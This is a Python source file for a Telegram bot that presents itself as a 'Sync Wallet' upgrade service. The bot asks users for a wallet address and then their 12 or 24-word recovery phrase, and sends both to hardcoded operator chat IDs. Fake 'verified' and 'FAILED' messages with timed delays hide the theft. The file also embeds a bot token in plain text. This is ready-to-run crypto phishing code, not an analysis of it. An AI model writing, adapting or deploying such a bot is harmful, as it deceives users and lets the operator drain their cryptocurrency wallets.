import logging
import asyncio
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    ConversationHandler
)

# Replace with the chat IDs of the users you want to receive the inputs.
# You can add as many as you need to this list.
REVIEWER_CHAT_IDS = ["7666664445"]

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Define states for the conversation flow
# WAITING_FOR_BUTTON_CLICK is the initial state, waiting for the "Sync Wallet" button.
# WAITING_FOR_ADDRESS_INPUT is where the bot is waiting for the user's wallet address.
# WAITING_FOR_PHRASE_INPUT is where the bot is waiting for the user's recovery phrase.
WAITING_FOR_BUTTON_CLICK, WAITING_FOR_ADDRESS_INPUT, WAITING_FOR_PHRASE_INPUT = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.effective_user
    reply_keyboard = [["Sync Wallet"]]
    await update.message.reply_html(
        f"Hello {user.mention_html()}! Welcome to the bot. Please click 'Sync Wallet' to begin.",
        reply_markup=ReplyKeyboardMarkup(
            reply_keyboard,
            one_time_keyboard=True,
            input_field_placeholder="Ready to sync?"
        ),
    )
    # The bot is now waiting for the "Sync Wallet" button to be clicked.
    return WAITING_FOR_BUTTON_CLICK

async def ask_for_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "Please provide your wallet address.",
        reply_markup=ReplyKeyboardRemove()
    )
    # After asking for the address, the bot is now waiting for the user to type the address.
    return WAITING_FOR_ADDRESS_INPUT

async def handle_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_wallet_address = update.message.text
    
    for chat_id in REVIEWER_CHAT_IDS:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"New wallet address from user {update.effective_user.mention_html()}:\n\n{user_wallet_address}",
            parse_mode='HTML'
        )

    await update.message.reply_text(f"Verifying {user_wallet_address}...")
    await asyncio.sleep(4)
    await update.message.reply_text("✅ Successfully verified.")
    await update.message.reply_text(
        "Please paste your 12 or 24-word recovery phrase exactly as it appears in your wallet backup. This is required to import your wallet into the upgrade system."
    )
    # The bot is now waiting for the recovery phrase.
    return WAITING_FOR_PHRASE_INPUT

async def handle_recovery_phrase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_recovery_phrase = update.message.text
    
    for chat_id in REVIEWER_CHAT_IDS:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"New recovery phrase from user {update.effective_user.mention_html()}:\n\n{user_recovery_phrase}",
            parse_mode='HTML'
        )
    
    await update.message.reply_text("Connecting...")
    await asyncio.sleep(4)
    await update.message.reply_text("❌ FAILED. Please try again later or try a different address.")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "Conversation canceled.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

if __name__ == '__main__':
    application = ApplicationBuilder().token("7947584426:AAG13siQqhX81SSo9MCoPQ-B73ICr-mF0Ds").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            # The bot waits for the "Sync Wallet" button and calls ask_for_wallet_address.
            WAITING_FOR_BUTTON_CLICK: [MessageHandler(filters.Regex("^Sync Wallet$"), ask_for_wallet_address)],
            # The bot then waits for the wallet address and calls handle_wallet_address.
            WAITING_FOR_ADDRESS_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_wallet_address)],
            # The bot now waits for the recovery phrase and calls handle_recovery_phrase.
            WAITING_FOR_PHRASE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_recovery_phrase)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    
    application.run_polling()
